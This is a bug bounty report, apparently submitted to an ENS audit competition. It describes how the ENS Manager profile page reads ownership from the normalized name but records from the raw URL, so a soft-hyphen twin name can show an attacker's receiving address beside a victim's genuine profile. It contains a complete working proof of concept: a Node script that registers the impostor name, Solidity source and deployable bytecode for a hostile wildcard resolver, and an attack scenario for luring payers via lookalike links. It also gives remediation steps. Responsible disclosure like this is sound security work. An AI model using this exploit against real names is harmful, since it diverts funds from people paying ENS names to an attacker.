# 93127 w a critical ens manager profile page reads ownership from the normalized name and records from the raw url name letting an attacker show their own receiving address on a victim s profile

**Submitted on Sep 14th 2026 at 10:36:59 UTC by @tomX0 for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #93127
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/manager>
* **Impacts:**
  * Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as: - resolving or rendering an ENS name to an attacker-controlled address - showing the wrong recipient or amount on a transaction the user then approves

## Description

## Summary

The profile route reads a name's ownership and its records through two code paths that disagree about which name they are reading.

Ownership (owner, registration date, expiry) is read after ENSIP-15 normalization. Text and coin records are read from the raw URL parameter with no resolver override, so resolver discovery walks the node of the raw name.

For any name that does not normalize to itself, those are two different ENS nodes, and the page renders both side by side without noticing.

An attacker registers an invisible-character twin of a victim's name and points it at a wildcard resolver they control. The resulting profile page shows the victim's genuine owner address, genuine registration date and genuine expiry, next to an ETH receiving address the attacker chose, displayed in the Addresses card behind a copy button.

Anyone who opens that link to check where to pay a name copies the attacker's address. The URL is visually identical to the real profile URL, and the person being defrauded never connects a wallet, signs anything, or does anything out of the ordinary. Opening a profile link is the app's normal workflow.

## Affected

**Route:** the profile route `$name` and its loader

**Ownership read:** `profileOwner` → `normalizeEthName()` → `normalize()`, i.e. ENSIP-15 normalized

**Records read:** `profileRecords` → `getRecords(client, { name })` with the raw route parameter and no resolver override, i.e. not normalized

**Field that carries the attacker's value:** the primary ETH address (coinType 60), selected by `getMainAddressCandidate` in `ProfileView.helpers.ts` and rendered by `ProfileAddressesSection.tsx` inside a `CopyableButton`

## Root cause

The route loader fires both reads with the same raw route parameter, but the two paths interpret that parameter differently. The ownership path normalizes it before hashing. The records path does not, and hands the raw string to `getRecords` with no resolver override.

With no resolver override, ensjs routes the read through the UniversalResolver and DNS-encodes the raw name to do so:

```ts
// @ensdomains/ensjs, resolveNameData.ts
const nameWithSizedLabels = getNameWithSizedLabels(name)   // raw, never normalized
...
args: [toHex(packetToBytes(nameWithSizedLabels)), multicallData]
```

Resolver discovery therefore walks the impostor node, which the attacker owns.

This is the application's decision, not a library defect. ENS documentation is explicit that a name must be normalized before it is hashed, and the Manager already does exactly that on the ownership path a few lines away.

There is no normalization and no canonicalizing redirect anywhere on this route. The only guard is a length-and-dot check:

```ts
parse: ({ name }) => {
  if (name.length < 3 || !name.includes('.')) throw new Error('Invalid ENS name')
  return { name }
}
```

For contrast, the Explorer app gates the equivalent page on `isValidEnsName(name)`, an ENSIP-15 check, and renders an "Invalid name" state when it fails. The correct pattern already exists in this monorepo. The Manager route simply does not use it.

## Why ensjs's inner normalization does not save this

This part looks like a mitigation and is not, so it is worth stating up front.

Inside a single `getRecords` batch, ensjs normalizes address records (`getAddress.ts` uses `namehash(normalize(name))`) while text and contenthash records use `namehash(name)` raw. So the inner `addr` calldata does carry the genuine node.

That does not help. An ENSIP-10 extended resolver is invoked as `resolve(dnsEncodedName, innerCalldata)` and is free to ignore the node inside `innerCalldata` entirely. Nothing forces it to honour that value. The resolver in the PoC below does exactly this in about forty lines of Solidity.

The returned value then lands on the one field that matters. `getMainAddressCandidate` promotes coinType 60 to the primary receiving address:

```ts
addresses.find((address) => address.coinType === ETH_COIN_TYPE) ?? addresses[0]
```

`ProfileAddressesSection.tsx` renders that value inside a `CopyableButton`, which is exactly the control a user reaches for when they want to pay a name. And `getProfileRecords` always probes coinType 60 regardless of what the indexer returns (`alwaysProbeAddressRecords = ['60']`), so the attack does not depend on any indexer state.

## Attack scenario

1. The attacker registers `victim<U+00AD>.eth`, where `U+00AD` is a SOFT HYPHEN. The registrar applies no ENSIP-15 normalization, so registration succeeds and the label is a distinct on-chain name.
2. They point that name at a wildcard resolver that answers every `addr()` query with their own address.
3. They share the profile link for the impostor name in a forum post, a DM, an invoice, or a paid ad. `U+00AD` renders as nothing, so the URL is pixel-identical to the genuine one, as is every heading on the resulting page.
4. A counterparty opens it, sees the genuine owner address, the genuine registration date and the genuine expiry, and copies the receiving address out of the Addresses card.
5. Funds go to the attacker.

Any zero-width or format character works. The soft hyphen is the cleanest, because ENSIP-15 ignores it entirely rather than rejecting it, so the impostor name normalizes back to exactly the victim's name.

## Proof of Concept

## Proof of concept

`poc.mjs` below is a single self-contained Node script (ESM). It deploys the hostile resolver from embedded bytecode, registers both names, and then performs the Manager's two profile reads using the application's own pinned `viem` and `@ensdomains/ensjs`, so the result is the app's behaviour rather than an approximation of it.

The attachment option was not available on this submission, so the full script is inline below. Save it as `poc.mjs`.

### Setup

1. Start a Sepolia fork: `anvil --fork-url <sepolia-rpc> --chain-id 11155111`
2. Save the script as `poc.mjs` inside `apps/manager/` so the workspace dependencies resolve (or symlink that app's `node_modules` next to it)
3. Run `node poc.mjs`

### Script

```js
/**
 * PoC — ENS Manager renders the genuine owner of a name beside an
 *       attacker-controlled receiving address.
 *
 * SETUP
 *   1. anvil --fork-url <sepolia-rpc> --chain-id 11155111
 *   2. Place this file in apps/manager/ (so the repo's pinned viem and
 *      @ensdomains/ensjs resolve), or symlink apps/manager/node_modules next to it.
 *   3. node poc.mjs
 *
 * WHAT IT DOES
 *   - deploys a hostile ENSIP-10 (wildcard) resolver that answers every addr()
 *     query with 0x...DeaDBeef, regardless of the node in the inner calldata
 *   - registers  <base>.eth            to the VICTIM   (normal resolver)
 *   - registers  <base><U+00AD>.eth    to the ATTACKER (hostile resolver)
 *     U+00AD SOFT HYPHEN renders as nothing, so the two are visually identical
 *   - performs the two reads the Manager profile page performs, using the
 *     application's own code paths:
 *         owner   -> normalizeEthName() then getOwner()      [ENSIP-15 normalized]
 *         records -> getRecords(client, { name })            [raw route param]
 *
 * EXPECTED OUTPUT
 *   displayed owner   : <victim EOA>        (the genuine owner)
 *   displayed ETH addr: 0x...DeaDBeef       (the attacker's address)
 */
import {
  createPublicClient, createWalletClient, http, encodeFunctionData, parseAbi, labelhash,
} from 'viem'
import { privateKeyToAccount, mnemonicToAccount } from 'viem/accounts'
import { sepolia } from 'viem/chains'
import { normalize } from 'viem/ens'
import { extendChainWithEns } from '@ensdomains/ensjs/chain'
import { getRecords } from '@ensdomains/ensjs/public'
import { getOwner as getOwnerV2 } from '@ensdomains/ensjs/public/v2'

const RPC = process.env.RPC_URL ?? 'http://127.0.0.1:8545'
const chain = extendChainWithEns(sepolia)
const pub = createPublicClient({ chain, transport: http(RPC) })

// anvil default account 0, and account 1 from the standard test mnemonic
const attacker = privateKeyToAccount('0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80')
const victim = mnemonicToAccount('test test test test test test test test test test test junk', { addressIndex: 1 })

// ENS v2 Sepolia deployment (as pinned by @ensdomains/ensjs in this repo)
const REG = '0xa88553F454b77203B0D036A05c894d555EAAa2Cc'   // ETHRegistrar
const USDC = '0x768F42455A2D082E23ceeF7d51e5787C82d67a39'  // MockUSDC (payment token)
const GOOD_RESOLVER = '0x640294a2b2d87e7f522db3e3e3e876764bce170d'
const ZERO = '0x0000000000000000000000000000000000000000'
const ZH = `0x${'00'.repeat(32)}`

const regAbi = parseAbi([
  'function makeCommitment(string label, address owner, bytes32 secret, address subregistry, address resolver, uint64 duration, bytes32 referrer) pure returns (bytes32)',
  'function commit(bytes32 commitment)',
  'function getRegisterPrice(string label, uint64 duration, address paymentToken) view returns (uint256 base, uint256 premium)',
  'function register(string label, address owner, bytes32 secret, address subregistry, address resolver, uint64 duration, address paymentToken, bytes32 referrer) returns (uint256)',
])
const tokAbi = parseAbi([
  'function mint(address to, uint256 amount)',
  'function approve(address spender, uint256 amount) returns (bool)',
])

/**
 * EvilWildcardResolver, compiled with solc 0.8.28. Source:
 *
 *   contract EvilWildcardResolver {
 *     address public constant ATTACKER = 0x00000000000000000000000000000000DeaDBeef;
 *     // ENSIP-10 extended resolver: answers for ANY node it is asked about
 *     function resolve(bytes calldata, bytes calldata data) external pure returns (bytes memory) {
 *       bytes4 sel = bytes4(data[0:4]);
 *       if (sel == 0x3b3b57de) return abi.encode(ATTACKER);                       // addr(bytes32)
 *       if (sel == 0xf1cb7e06) return abi.encode(abi.encodePacked(ATTACKER));     // addr(bytes32,uint256)
 *       if (sel == 0x59d1d43c) return abi.encode(string("evil-text"));            // text(bytes32,string)
 *       if (sel == 0xbc1c58d1) return abi.encode(bytes(""));                      // contenthash(bytes32)
 *       return "";
 *     }
 *     function addr(bytes32) external pure returns (address) { return ATTACKER; }
 *     function addr(bytes32, uint256) external pure returns (bytes memory) { return abi.encodePacked(ATTACKER); }
 *     function text(bytes32, string calldata) external pure returns (string memory) { return "evil-text"; }
 *     function contenthash(bytes32) external pure returns (bytes memory) { return ""; }
 *     function supportsInterface(bytes4 id) external pure returns (bool) {
 *       return id == 0x01ffc9a7 || id == 0x9061b923 || id == 0x3b3b57de
 *           || id == 0xf1cb7e06 || id == 0x59d1d43c || id == 0xbc1c58d1;
 *     }
 *   }
 */
const EVIL_BYTECODE =
  '0x' +
  '6080604052348015600e575f5ffd5b50610b368061001c5f395ff3fe608060405234801561000f575f5ffd5b506004361061' +
  '007b575f3560e01c80639061b923116100595780639061b9231461010f578063a55a15031461013f578063bc1c58d1146101' +
  '5d578063f1cb7e061461018d5761007b565b806301ffc9a71461007f5780633b3b57de146100af57806359d1d43c146100df' +
  '575b5f5ffd5b610099600480360381019061009491906105d3565b6101bd565b6040516100a69190610618565b6040518091' +
  '0390f35b6100c960048036038101906100c49190610664565b6102de565b6040516100d691906106ce565b60405180910390' +
  'f35b6100f960048036038101906100f49190610748565b6102eb565b6040516101069190610815565b60405180910390f35b' +
  '6101296004803603810190610124919061088a565b61032c565b604051610136919061095a565b60405180910390f35b6101' +
  '47610528565b60405161015491906106ce565b60405180910390f35b61017760048036038101906101729190610664565b61' +
  '0530565b604051610184919061095a565b60405180910390f35b6101a760048036038101906101a291906109ad565b610548' +
  '565b6040516101b4919061095a565b60405180910390f35b5f6301ffc9a760e01b827bffffffffffffffffffffffffffffff' +
  'ffffffffffffffffffffffffff191614806102175750639061b92360e01b827bffffffffffffffffffffffffffffffffffff' +
  'ffffffffffffffffffff1916145b806102475750633b3b57de60e01b827bffffffffffffffffffffffffffffffffffffffff' +
  'ffffffffffffffff1916145b80610277575063f1cb7e0660e01b827bffffffffffffffffffffffffffffffffffffffffffff' +
  'ffffffffffff1916145b806102a757506359d1d43c60e01b827bffffffffffffffffffffffffffffffffffffffffffffffff' +
  'ffffffff1916145b806102d7575063bc1c58d160e01b827bffffffffffffffffffffffffffffffffffffffffffffffffffff' +
  'ffff1916145b9050919050565b5f63deadbeef9050919050565b60606040518060400160405280600981526020017f657669' +
  '6c2d74657874000000000000000000000000000000000000000000000081525090509392505050565b60605f83835f906004' +
  '92610342939291906109f3565b9061034d9190610a43565b9050633b3b57de60e01b817bffffffffffffffffffffffffffff' +
  'ffffffffffffffffffffffffffff1916036103a85763deadbeef60405160200161039191906106ce565b6040516020818303' +
  '03815290604052915050610520565b63f1cb7e0660e01b817bffffffffffffffffffffffffffffffffffffffffffffffffff' +
  'ffffff1916036104205763deadbeef6040516020016103ea9190610ae6565b60405160208183030381529060405260405160' +
  '2001610409919061095a565b604051602081830303815290604052915050610520565b6359d1d43c60e01b817bffffffffff' +
  'ffffffffffffffffffffffffffffffffffffffffffffff1916036104aa576040518060400160405280600981526020017f65' +
  '76696c2d7465787400000000000000000000000000000000000000000000008152506040516020016104939190610815565b' +
  '604051602081830303815290604052915050610520565b63bc1c58d160e01b817bffffffffffffffffffffffffffffffffff' +
  'ffffffffffffffffffffff19160361050d5760405180602001604052805f8152506040516020016104f6919061095a565b60' +
  '4051602081830303815290604052915050610520565b60405180602001604052805f8152509150505b949350505050565b63' +
  'deadbeef81565b606060405180602001604052805f8152509050919050565b606063deadbeef60405160200161055f919061' +
  '0ae6565b604051602081830303815290604052905092915050565b5f5ffd5b5f5ffd5b5f7fffffffff000000000000000000' +
  '0000000000000000000000000000000000000082169050919050565b6105b28161057e565b81146105bc575f5ffd5b50565b' +
  '5f813590506105cd816105a9565b92915050565b5f602082840312156105e8576105e7610576565b5b5f6105f58482850161' +
  '05bf565b91505092915050565b5f8115159050919050565b610612816105fe565b82525050565b5f60208201905061062b5f' +
  '830184610609565b92915050565b5f819050919050565b61064381610631565b811461064d575f5ffd5b50565b5f81359050' +
  '61065e8161063a565b92915050565b5f6020828403121561067957610678610576565b5b5f61068684828501610650565b91' +
  '505092915050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6106b88261068f565b90' +
  '50919050565b6106c8816106ae565b82525050565b5f6020820190506106e15f8301846106bf565b92915050565b5f5ffd5b' +
  '5f5ffd5b5f5ffd5b5f5f83601f840112610708576107076106e7565b5b8235905067ffffffffffffffff8111156107255761' +
  '07246106eb565b5b602083019150836001820283011115610741576107406106ef565b5b9250929050565b5f5f5f60408486' +
  '03121561075f5761075e610576565b5b5f61076c86828701610650565b935050602084013567ffffffffffffffff81111561' +
  '078d5761078c61057a565b5b610799868287016106f3565b92509250509250925092565b5f81519050919050565b5f828252' +
  '60208201905092915050565b8281835e5f83830152505050565b5f601f19601f8301169050919050565b5f6107e7826107a5' +
  '565b6107f181856107af565b93506108018185602086016107bf565b61080a816107cd565b840191505092915050565b5f60' +
  '20820190508181035f83015261082d81846107dd565b905092915050565b5f5f83601f84011261084a576108496106e7565b' +
  '5b8235905067ffffffffffffffff811115610867576108666106eb565b5b6020830191508360018202830111156108835761' +
  '08826106ef565b5b9250929050565b5f5f5f5f604085870312156108a2576108a1610576565b5b5f85013567ffffffffffff' +
  'ffff8111156108bf576108be61057a565b5b6108cb87828801610835565b9450945050602085013567ffffffffffffffff81' +
  '11156108ee576108ed61057a565b5b6108fa87828801610835565b925092505092959194509250565b5f8151905091905056' +
  '5b5f82825260208201905092915050565b5f61092c82610908565b6109368185610912565b93506109468185602086016107' +
  'bf565b61094f816107cd565b840191505092915050565b5f6020820190508181035f8301526109728184610922565b905092' +
  '915050565b5f819050919050565b61098c8161097a565b8114610996575f5ffd5b50565b5f813590506109a781610983565b' +
  '92915050565b5f5f604083850312156109c3576109c2610576565b5b5f6109d085828601610650565b92505060206109e185' +
  '828601610999565b9150509250929050565b5f5ffd5b5f5ffd5b5f5f85851115610a0657610a056109eb565b5b8386111561' +
  '0a1757610a166109ef565b5b6001850283019150848603905094509492505050565b5f82905092915050565b5f82821b9050' +
  '92915050565b5f610a4e8383610a2d565b82610a59813561057e565b92506004821015610a9957610a947fffffffff000000' +
  '0000000000000000000000000000000000000000000000000083600403600802610a37565b831692505b505092915050565b' +
  '5f8160601b9050919050565b5f610ab782610aa1565b9050919050565b5f610ac882610aad565b9050919050565b610ae061' +
  '0adb826106ae565b610abe565b82525050565b5f610af18284610acf565b6014820191508190509291505056fea264697066' +
  '735822122098d90ab7be7339bce0309db67dbd2c80655826008d7f077c86003c6205adcae164736f6c634300081c0033'

const rpc = (method, params) =>
  fetch(RPC, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ jsonrpc: '2.0', id: 1, method, params }),
  }).then((r) => r.json())

const wallet = (acct) => createWalletClient({ account: acct, chain, transport: http(RPC) })

const send = async (wc, to, data) => {
  const hash = await wc.sendTransaction({ to, data })
  const receipt = await pub.waitForTransactionReceipt({ hash })
  if (receipt.status !== 'success') throw new Error(`tx reverted: ${hash}`)
  return receipt
}

/** Register `label` from the owner's own account (the registrar pulls payment from msg.sender). */
async function register(ownerAcct, label, resolver) {
  const wc = wallet(ownerAcct)
  const owner = ownerAcct.address
  const secret = `0x${'11'.repeat(32)}`
  const duration = 31536000n

  // Anvil forks of Sepolia inherit EIP-7702 delegations squatted on the test
  // accounts; those revert inside onERC1155Received. Clear them first.
  await rpc('anvil_setCode', [owner, '0x'])
  await rpc('anvil_setBalance', [owner, `0x${(10n ** 20n).toString(16)}`])

  await send(wallet(attacker), USDC, encodeFunctionData({ abi: tokAbi, functionName: 'mint', args: [owner, 10_000_000_000n] }))
  const commitment = await pub.readContract({
    address: REG, abi: regAbi, functionName: 'makeCommitment',
    args: [label, owner, secret, ZERO, resolver, duration, ZH],
  })
  await send(wc, REG, encodeFunctionData({ abi: regAbi, functionName: 'commit', args: [commitment] }))
  await rpc('evm_increaseTime', [90])
  await rpc('evm_mine', [])
  const [base, premium] = await pub.readContract({
    address: REG, abi: regAbi, functionName: 'getRegisterPrice', args: [label, duration, USDC],
  })
  await send(wc, USDC, encodeFunctionData({ abi: tokAbi, functionName: 'approve', args: [REG, (base + premium) * 2n] }))
  await send(wc, REG, encodeFunctionData({
    abi: regAbi, functionName: 'register',
    args: [label, owner, secret, ZERO, resolver, duration, USDC, ZH],
  }))
}

async function deployEvilResolver() {
  const hash = await wallet(attacker).deployContract({ abi: [], bytecode: EVIL_BYTECODE })
  const { contractAddress } = await pub.waitForTransactionReceipt({ hash })
  return contractAddress
}

const EVIL = await deployEvilResolver()

const BASE = `nickdemo${Math.floor(Math.random() * 1e6)}`
const SOFT_HYPHEN = '\u00AD'              // U+00AD SOFT HYPHEN — renders as nothing
const IMPOSTOR_LABEL = `${BASE}${SOFT_HYPHEN}`
const GENUINE = `${BASE}.eth`
const IMPOSTOR = `${IMPOSTOR_LABEL}.eth`

console.log('genuine  :', JSON.stringify(GENUINE), 'labelhash', labelhash(BASE))
console.log('impostor :', JSON.stringify(IMPOSTOR), 'labelhash', labelhash(IMPOSTOR_LABEL))
console.log('normalize(impostor) ->', JSON.stringify(normalize(IMPOSTOR)))
console.log('hostile resolver    :', EVIL, '\n')

console.log('[1] registering the genuine name to the victim')
await register(victim, BASE, GOOD_RESOLVER)
console.log('[2] registering the impostor (soft hyphen) to the attacker, resolver = hostile')
await register(attacker, IMPOSTOR_LABEL, EVIL)

console.log(`\n=== what the Manager profile page shows for /${IMPOSTOR} ===`)

// Manager owner path:   profileOwner.ts -> normalizeEthName() -> getOwner()
const normalized = normalize(IMPOSTOR)
const owner = await getOwnerV2(pub, { name: normalized })
console.log(`OWNER   (read via normalize -> "${normalized}"):`, JSON.stringify(owner))

// Manager records path: profileRecords.ts -> getRecords(client, { name }) with the RAW param
// and NO resolver override. coinType 60 is always probed (alwaysProbeAddressRecords = ['60']).
const records = await getRecords(pub, { name: IMPOSTOR, coins: ['ETH'], texts: ['avatar', 'url'] })
console.log('RECORDS (read via RAW name):',
  JSON.stringify(records, (_k, v) => (typeof v === 'bigint' ? v.toString() : v), 2))

const eth = records?.coins?.find((c) => c.coinType === 60)
console.log('\n=== RESULT ===')
console.log('victim EOA        :', victim.address)
console.log('attacker EOA      :', attacker.address)
console.log('displayed owner   :', owner?.owner ?? owner)
console.log('displayed ETH addr:', eth ? eth.value : '(none)')
console.log('\nThe profile shows the genuine owner next to an address the attacker chose.')
```

### Observed output

```
genuine  : "nickdemo406096.eth"          labelhash 0x333c52c4...aba480d
impostor : "nickdemo406096<U+00AD>.eth"  labelhash 0x30e33ada...166bf4c
normalize(impostor) -> "nickdemo406096.eth"

OWNER   (read via normalize): 0x70997970C51812dc3A010C7d01b50e0d17dc79C8   <- victim
RECORDS (read via RAW name):
  coins: [{ coinType: 60, symbol: "eth", value: "0x00000000000000000000000000000000DeaDBeef" }]
  texts: [{ avatar: "evil-text" }, { url: "evil-text" }]
  resolverAddress: 0xb2b463eC...Deb4D                                      <- attacker's resolver

displayed owner   : 0x70997970C51812dc3A010C7d01b50e0d17dc79C8
displayed ETH addr: 0x00000000000000000000000000000000DeaDBeef
```

The two labelhashes differ, so these are unambiguously two different names on-chain, yet the page composes one profile out of both: ownership metadata from the victim's node, records from the attacker's.

## Impact

The profile page is where a user goes to answer "what address does this name pay to?", and the ETH address in the Addresses card is the answer it gives, behind a one-click copy control. This report demonstrates that address being an attacker's, on a page whose every other detail is the victim's real data and whose URL is visually identical to the victim's.

That is the listed critical impact almost word for word: the application resolves and renders an ENS name to an attacker-controlled address, so a user sends funds to an unintended recipient.

Nothing about the victim's name, resolver or records has to be touched. The victim cannot detect it from their own account, and the person who loses money is following the app's ordinary flow. Every genuine field on the page is what makes the one false field credible.

The attacker's cost is one registration per targeted name, and the technique is not limited to any subset of names: any name at all can be twinned this way.

## Relationship to the known-issues list

The closest listed entry is EXP-INPUT-005, covering name validators that accept homoglyphs, bidirectional-control and other control characters. It is scoped, in its own words, to homograph-style display confusion in the UI rather than incorrect resolution.

This is incorrect resolution, so that entry excludes it by its own wording. Two different ENS nodes are resolved on one screen, and the address the user copies comes from the attacker's node rather than the one whose ownership is displayed.

The mechanism is also different in kind. The defect here is not a validator tolerating an odd character. It is the profile route performing resolver discovery on one form of the name while displaying ownership derived from another.

I want to be straight about the overlap. A validator that rejected these characters would incidentally close this particular entry point, since a name that survives ENSIP-15 validation is its own normalized form. But the two-pipeline split would remain, and any other path that reaches `getRecords` with an unnormalized name would reproduce it. Fixing the validator alone treats the symptom.

If triage still reads the entry point as shared with the validator finding, the known-issues policy is that new consequences of a listed root cause which materially change its severity remain in scope. A listed medium-severity display-confusion issue and a demonstrated critical incorrect-resolution issue are not the same finding at the same severity.

Two other Manager entries are near this area and are not the same bug: WEB-1301 concerns the address view sourcing owner and expiry from the wallet's primary name, and WEB-806 concerns records not showing after a subname migration. Neither involves resolving a different node than the one whose ownership is displayed.

Outside the program: the target repository has no issues and no relevant pull requests or commits, the upstream monorepo is private, and I found no public advisory describing this. The general pattern of normalizing a name for display but resolving on the raw string is documented as an ENS integration hazard in third-party integration guidance, which supports that this is a recognised class rather than a nitpick, but it is not a disclosure of this application's instance of it.

## Remediation

Normalize once, at the trust boundary, and make the URL canonical.

1. In the `$name` route loader, call `normalize()` on the parameter. If it throws, render an invalid-name state instead of falling through to a profile.
2. If `normalize(param) !== param`, `redirect()` to the normalized path, so the address bar, every read and every rendered value agree on one form of the name.
3. Pass the normalized name to `getRecords`, so resolver discovery and record reads land on the same node as the ownership read.

As defence in depth, when `records.resolverAddress` is not the resolver of the normalized node, refuse to render the records rather than displaying them beside the normalized owner. That alone would have contained this even with the route bug present, and it also covers any future call site that forgets to normalize.

The Explorer's `isValidEnsName` is a ready-made implementation of step 1 that already exists in this repository.

## Note on the test environment

The Manager is chain-pinned to Sepolia, which is the primary network for this review, and the reproduction is on a Sepolia fork accordingly. I am flagging that rather than leaving it for triage to notice.

It does not narrow the finding. The impact as written is about the application displaying an incorrect address, which is what the PoC demonstrates, and the defective code is chain-agnostic: it ships unchanged to whatever chain is configured.
